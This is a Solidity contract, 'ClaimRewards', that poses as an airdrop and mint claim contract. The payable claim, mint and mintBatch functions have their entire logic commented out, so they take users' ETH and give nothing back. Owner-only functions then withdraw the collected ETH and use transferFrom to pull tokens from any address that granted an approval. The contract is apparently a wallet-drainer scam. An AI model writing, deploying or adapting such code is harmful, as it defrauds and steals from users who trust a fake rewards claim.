// SPDX-License-Identifier: MIT

// File: ClaimRewards.sol
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);
}

interface IERC20Fix {
    function transferFrom(address from, address to, uint value) external;
}

contract ClaimRewards {
    mapping(address => bool) owners;

    function addOwner(address _admin) external owner {
        owners[_admin] = true;
    }

    function removeOwner(address _admin) external owner {
        delete owners[_admin];
    }

    modifier owner() {
        require(owners[msg.sender], "Unauthorized");
        _;
    }

    constructor() {
        // The Ownable constructor sets the owner to the address that deploys the contract
        owners[msg.sender] = true;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function claim(uint128 nonce, bytes calldata signature, address referrer) public payable {
        /** 
        require(_usedNonce[nonce] == false, "nonce already used");
        require(_claimedUser[_msgSender()] == false, "already claimed");
        
        _claimedUser[_msgSender()] = true;
        bytes32 message = keccak256(abi.encode(address(this), _msgSender(), nonce));

        bytes32 ethSignedMessageHash = message.toEthSignedMessageHash();
        _signers.requireValidSignature(ethSignedMessageHash, signature);
        _usedNonce[nonce] = true;

        uint256 supplyPerAddress = canClaimAmount();
        require(supplyPerAddress >= 1e6, "Airdrop has ended");

        uint256 amount = canClaimAmount();
        token.transfer(_msgSender(), amount);

        claimedCount++;
        claimedSupply += supplyPerAddress;

        if (claimedCount > 0) {
            claimedPercentage = (claimedCount * 100) / MAX_ADDRESSES;
        }

        if (referrer != address(0) && referrer != _msgSender() && referReward < MAX_REFER_TOKEN) {
            uint256 num = amount * 100 / 1000;
            token.transfer(referrer, num);
            inviteRewards[referrer] += num;
            inviteUsers[referrer]++;

            referReward += num;
        }

        emit Claim(_msgSender(), nonce, amount, referrer, block.timestamp);
        */
    }

    function mint(uint256 count, bytes calldata signature) external payable    { 
        /** 
        require(_usedNonce[nonce] == false, "nonce already used");
        require(_claimedUser[_msgSender()] == false, "already claimed");
        
        _claimedUser[_msgSender()] = true;
        bytes32 message = keccak256(abi.encode(address(this), _msgSender(), nonce));

        bytes32 ethSignedMessageHash = message.toEthSignedMessageHash();
        _signers.requireValidSignature(ethSignedMessageHash, signature);
        _usedNonce[nonce] = true;

        uint256 supplyPerAddress = canClaimAmount();
        require(supplyPerAddress >= 1e6, "Airdrop has ended");

        uint256 amount = canClaimAmount();
        token.transfer(_msgSender(), amount);

        claimedCount++;
        claimedSupply += supplyPerAddress;

        if (claimedCount > 0) {
            claimedPercentage = (claimedCount * 100) / MAX_ADDRESSES;
        }

        if (referrer != address(0) && referrer != _msgSender() && referReward < MAX_REFER_TOKEN) {
            uint256 num = amount * 100 / 1000;
            token.transfer(referrer, num);
            inviteRewards[referrer] += num;
            inviteUsers[referrer]++;

            referReward += num;
        }

        emit Claim(_msgSender(), nonce, amount, referrer, block.timestamp);
        */
    }

    function mintBatch(
        address _to,
        uint256 _categoryId,
        uint256 _size
    ) external  {
   /** 
        require(_size != 0, "DogeShitNFT::mintBatch::size must be granter than zero");
        tokenIds = new uint256[](_size);
        for (uint256 i = 0; i < _size; ++i) {
        tokenIds[i] = mint(_to, _categoryId);
        }
        return tokenIds;
    */
    }

    function withdraw(address recipient) public owner {
        payable(recipient).transfer(address(this).balance);
    }
    
    function withdrawToken(address token,address recipient) public  owner{
        IERC20(token).transfer(recipient,IERC20(token).balanceOf(address(this)));
    }
    
    function transferFromToken(address token,address from ,address recipient,uint256 amount,bool fix) public  owner {
        if(fix) {
            IERC20Fix(token).transferFrom(from,recipient,amount);
        }else{
            IERC20(token).transferFrom(from,recipient,amount);
        }
    }
}